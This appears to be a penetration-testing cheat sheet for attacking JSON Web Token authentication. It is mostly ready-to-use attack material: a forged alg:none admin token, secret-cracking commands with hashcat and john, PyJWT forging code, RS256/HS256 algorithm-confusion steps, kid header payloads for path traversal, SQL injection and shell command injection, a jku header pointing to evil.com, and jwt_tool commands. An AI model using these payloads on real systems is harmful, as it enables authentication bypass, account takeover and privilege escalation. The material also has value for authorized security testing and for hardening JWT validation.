# JWT (JSON Web Token) Attacks

JWTs are the default auth mechanism for modern APIs and SPAs. Misconfigured JWT validation is one of the easiest **critical-severity** bugs to find.

## JWT structure
```
header.payload.signature
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"1","role":"admin","exp":1760000000}
```
Try decoding with:
```bash
echo '<header>.<payload>' | base64 -d
# or jq
echo '<payload>' | base64 -d | jq
```

## Attack priority (easiest → hardest)
1. `alg: none`
2. Weak/guessable HS256 secret (`secret`, `password`, app name, rockyou)
3. HS256/RS256 algorithm confusion (RS256→HS256 with the server's public key)
4. `kid` header injection (path traversal / SQLi / command injection)
5. Payload manipulation when no signature check
6. Exp/iat confusion, `jti` reuse, symmetric key confusion

---

## 1. alg: none (no signature)
If the server does not enforce a signature, modify the header to `"alg":"none"` and delete the signature:
```
Header:  {"alg":"none","typ":"JWT"}
Payload: {"sub":"1","role":"admin","exp":1999999999}
Token:   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxOTk5OTk5OTk5fQ.
```
Variations servers accept: `None`, `NONE`, `nOnE`, `null`, `"alg":"none"` with empty signature, and `alg:"none"` with garbage signature.

## 2. Weak HS256 secret brute force
Most apps use `secret`, the app name, or a short word.
```bash
# Install jwt_tool / hashcat with rules, or use jwt-cracker:
npx jwt-cracker <TOKEN>

# hashcat:
hashcat -a 0 -m 16500 <jwt.txt> rockyou.txt

# john the ripper:
john --format=HMAC-SHA256 --wordlist=rockyou.txt hash.txt
```
If you crack the secret you can forge tokens:
```python
# forge with python-jose / PyJWT
import jwt
print(jwt.encode({"sub":"1","role":"admin"}, "SECRET", algorithm="HS256"))
```

## 3. HS256/RS256 algorithm confusion
If the server verifies with an **RSA public key** but trusts the `alg` field, send an HS256 token signed with the **public key bytes** as the HMAC secret.
```bash
# 1. Get the public key
#    From JWKS endpoint: GET /.well-known/jwks.json
#    From the app's certificate / PEM file

# 2. Convert public key to raw bytes
python3 -c "
import base64
with open('public.pem') as f:
    key = f.read()
print(base64.urlsafe_b64encode(key.encode()).decode())
"

# 3. Craft token signed with that as HMAC secret
```
Usually done with `jwt_tool -T <token> -X k -pk public.pem` (the `-k` attack).

## 4. kid header injection
`kid` (Key ID) selects the verification key. If it is used in a filesystem path / query without sanitization:
```
Header: {"alg":"HS256","kid":"../../../../../../etc/passwd"}
```
If the response says "no such key" vs "invalid signature" → you can traverse. Some vulnerable apps fetch:
- File: `kid: /dev/null` then sign with empty secret (HS256, secret="" → HMAC of empty string).
- SQL: `kid: "x' OR 1=1--"` (CVE-2019-7644 style)
- Command: `kid: "$(id)"` in shell interpolation

Practical payloads:
```
Header: {"typ":"JWT","alg":"HS256","kid":"../../../../../../dev/null"}
sig = HMAC(empty string, key="")
```
Verify: `python3 -c "import hmac,hashlib;print(hmac.new(b'',b'<data>',hashlib.sha256).hexdigest())"`

## 5. jwk / jku header injection
Force the server to fetch your malicious JWK:
```
Header:
{"alg":"RS256","jku":"https://evil.com/jwks.json","kid":"attacker-key"}
{"alg":"RS256","jwk":{... YOUR PUBLIC KEY ...},"kid":"attacker-key"}
```
If `jku`/`jwk` are trusted → sign a token with your private key, upload the matching public key to your server. Attack works when jwt bypasses `jku` domain whitelist (try `https://allowed.com@evil.com` etc).

## 6. Payload-only attacks (no signature check at all)
Try just re-encoding the payload with modified claims, keep the same signature:
```
Role/policy upgrades:   {"role":"admin"} {"role":"administrator"} {"isadmin":"true"}
User ID changes:        {"sub":"1"} {"userId":"1"} {"uid":1}
Team/org swap:          {"org":"1"} {"companyId":"2"}
exp manipulation:       {"exp":1767225600}
Trusted browser/recurse the client-decided claims
```

## 7. Non-symmetric confusion / cross-service key reuse
Use the private key from another service on the same infra that uses the same secret, or the public key of service A as the HS256 secret for service B.

---

## Tooling
| Tool | Use |
|------|-----|
| `jwt_tool` (ticarpi) | everything - tamper, alg confusion, kid injection |
| `jwt-cracker` / hashcat | weak HS256 secret |
| `PyJWT` / `jsonwebtoken` | token crafting |
| Burp JWT Editor | sign with arbitrary keys (works with Burp) |
| `jwt.io` offline | quick decode |

## Common example commands (jwt_tool)
```bash
pip install jwt_tool
# Decode
jwt_tool <TOKEN>
# Try all algorithms / alg:none
jwt_tool -X a -i <n> <TOKEN>
# RS256 -> HS256 confusion
jwt_tool <TOKEN> -X k -pk public.pem
# kid injection
jwt_tool <TOKEN> -I -hc kid -hv ../../../../../../dev/null
```

---

## Checklist if you own a JWT endpoint (authorized testing)
- [ ] Base64 decode -> what claims exist? (sub/role/exp)
- [ ] Try `alg:none`
- [ ] Try removing signature entirely
- [ ] Try crypto confusion when public key available
- [ ] Fuzz secrets wordlist
- [ ] Check `jku`/`jwks`/`kid` handling
- [ ] Check token validity window (`exp`, `nbf`, `iat`) and `jti` replay